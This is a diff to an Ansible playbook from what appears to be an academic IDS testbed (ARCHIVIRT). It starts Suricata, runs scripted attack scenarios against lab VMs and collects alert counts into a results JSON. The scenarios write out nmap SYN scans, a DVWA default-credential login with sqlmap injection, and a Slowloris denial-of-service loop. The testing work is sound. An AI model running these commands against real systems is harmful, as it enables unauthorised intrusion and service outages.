@@ -1,5 +1,5 @@
 ---
-# ARCHIVIRT - Suricata Test Scenario Playbook (IaC compliant)
+# ARCHIVIRT - Suricata Test Scenario Playbook (IaC with auto-collect)
 # Author: Yasnemanegre SAWADOGO (SPbGUPTD)
 # Usage: ansible-playbook suricata_scenario.yml -e "scenario=SCN-001"
 
@@ -11,23 +11,22 @@
     suricata_script: /opt/archivirt/scripts/run_suricata.sh
 
   tasks:
-    - name: Setup traffic mirrors from all VMs
-      shell: |
-        sudo bash /home/archivirt/ARCHIVIRT/scripts/archivirt_mirrors.sh 2>/dev/null
+    - name: Setup traffic mirrors
+      shell: sudo bash /home/archivirt/ARCHIVIRT/scripts/archivirt_mirrors.sh 2>/dev/null
       delegate_to: localhost
       become: yes
 
-    - name: Deploy run_suricata.sh to monitor
+    - name: Deploy run_suricata.sh
       copy:
         src: /home/archivirt/ARCHIVIRT/scripts/run_suricata.sh
         dest: /opt/archivirt/scripts/run_suricata.sh
         mode: 0755
 
-    - name: Stop any previous Suricata instance
+    - name: Stop previous Suricata
       shell: "bash {{ suricata_script }} stop {{ scenario }}"
       ignore_errors: yes
 
-    - name: Start Suricata for scenario
+    - name: Start Suricata
       shell: "bash {{ suricata_script }} start {{ scenario }}"
 
 - name: ARCHIVIRT - Run attack scenario
@@ -40,8 +39,7 @@
     - name: "SCN-001 Port Scan"
       shell: |
         for i in $(seq 1 10); do
-          nmap -sS -Pn -p 1-1024 --min-rate 1000 -T4 \
-            10.0.2.11 10.0.2.12 10.0.2.13 -oN /dev/null 2>/dev/null
+          nmap -sS -Pn -p 1-1024 --min-rate 1000 -T4 10.0.2.11 10.0.2.12 10.0.2.13 -oN /dev/null 2>/dev/null
           sleep 3
         done
       when: scenario == "SCN-001"
@@ -49,8 +47,7 @@
     - name: "SCN-002 SSH Brute-force"
       shell: |
         for i in $(seq 1 10); do
-          nmap -sS -Pn -p 22 --min-rate 500 -T4 \
-            10.0.2.11 10.0.2.12 10.0.2.13 2>/dev/null
+          nmap -sS -Pn -p 22 --min-rate 500 -T4 10.0.2.11 10.0.2.12 10.0.2.13 2>/dev/null
           sleep 3
         done
       when: scenario == "SCN-002"
@@ -62,14 +59,12 @@
             COOKIE=$(curl -s -c - 'http://10.0.2.11/dvwa/login.php' --data 'username=admin&password=password&Login=Login' | grep PHPSESSID | awk '{print $NF}')
             echo $COOKIE
           register: dvwa_cookie
-
-        - name: Run sqlmap with valid cookie
+        - name: Run sqlmap
           shell: |
             for i in $(seq 1 10); do
               sqlmap -u "http://10.0.2.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
                 --cookie="PHPSESSID={{ dvwa_cookie.stdout }};security=low" \
-                --batch --level=1 --risk=1 --technique=B \
-                --output-dir=/tmp/sqlmap_$i 2>/dev/null
+                --batch --level=1 --risk=1 --technique=B --output-dir=/tmp/sqlmap_$i 2>/dev/null
               sleep 5
             done
       when: scenario == "SCN-003"
@@ -77,8 +72,7 @@
     - name: "SCN-004 DDoS Slowloris"
       shell: |
         for i in $(seq 1 10); do
-          timeout 20 python3 /opt/archivirt/attack-scripts/slowloris.py \
-            10.0.2.11 --port 80 --sockets 150 --duration 15 2>/dev/null
+          timeout 20 python3 /opt/archivirt/attack-scripts/slowloris.py 10.0.2.11 --port 80 --sockets 150 --duration 15 2>/dev/null
           sleep 5
         done
       when: scenario == "SCN-004"
@@ -92,7 +86,7 @@
         done
       when: scenario == "SCN-005"
 
-- name: ARCHIVIRT - Stop Suricata and collect results
+- name: ARCHIVIRT - Collect Suricata results
   hosts: monitor
   become: yes
   vars:
@@ -104,16 +98,27 @@
       shell: "bash {{ suricata_script }} stop {{ scenario }}"
       ignore_errors: yes
 
-    - name: Fetch eve.json
-      fetch:
-        src: "/var/log/suricata/{{ scenario }}/eve.json"
-        dest: "/tmp/suricata_{{ scenario }}_eve.json"
-        flat: yes
-
     - name: Count alerts
       shell: grep -c '"event_type":"alert"' /var/log/suricata/{{ scenario }}/eve.json 2>/dev/null || echo 0
       register: alert_count
 
-    - name: Show results
+    - name: Update results JSON
+      copy:
+        content: |
+          {
+            "scenario": "{{ scenario }}",
+            "ids": "Suricata 6.0.4",
+            "alerts": {{ alert_count.stdout | default(0) }},
+            "date": "{{ ansible_date_time.date }}"
+          }
+        dest: "/tmp/suricata_{{ scenario }}_result.json"
+
+    - name: Fetch result to localhost
+      fetch:
+        src: "/tmp/suricata_{{ scenario }}_result.json"
+        dest: "/tmp/suricata_{{ scenario }}_result.json"
+        flat: yes
+
+    - name: Show result
       debug:
-        msg: "{{ scenario }}: {{ alert_count.stdout }} alerts"
+        msg: "Suricata {{ scenario }}: {{ alert_count.stdout }} alerts"
